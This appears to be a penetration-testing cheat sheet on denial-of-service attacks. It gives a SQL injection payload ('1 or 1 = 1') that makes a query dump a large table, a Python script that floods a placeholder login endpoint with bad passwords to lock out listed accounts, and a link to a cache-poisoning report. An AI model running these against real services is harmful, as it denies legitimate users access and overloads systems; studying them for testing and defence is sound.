# DoS (Denial of Service)

## Table of Contents
- [Resource Exhaustion via Large Query](#resource-exhaustion-via-large-query)
- [Account Lockout](#account-lockout)
- [Chaining with Cache Poisoning](#chaining-with-cache-poisoning)

## Resource Exhaustion via Large Query

### A query that retrieves a large amount of data can cause a denial of service by putting a heavy load on the database.

- Abusing search/filter functionality
    1. Query that filters large table by id
        ```sql
        SELECT * FROM large_table WHERE id = {user_input};
        ```
    2. Standard query
        ```sql
        SELECT * FROM large_table WHERE id = 1;
        ```
    3. Manipulated query
        ```sql
        SELECT * FROM large_table WHERE id = 1 or 1 = 1;
        ```

## Account Lockout

### An attacker can cause a denial of service for legitimate users by intentionally triggering account lockouts.

- Brute-force on multiple accounts
    ```python
    import requests

    login_url = "https://[VULNERABLE-SERVICE]/login"

    with open("user_list.txt", "r", encoding="utf-8") as f:
        users = [line.strip() for line in f if line.strip()]

    for username in users:
        payload = {
            "username": username,
            "password": "invalid_password"
        }
        requests.post(login_url, data=payload)
    ```

## Chaining with Cache Poisoning

### Cache poisoning can turn self-targeted vulnerabilities into attacks that affect multiple users.

- Denial of service via cache poisoning
    - Hackerone report, [Denial of service via cache poisoning](https://hackerone.com/reports/409370)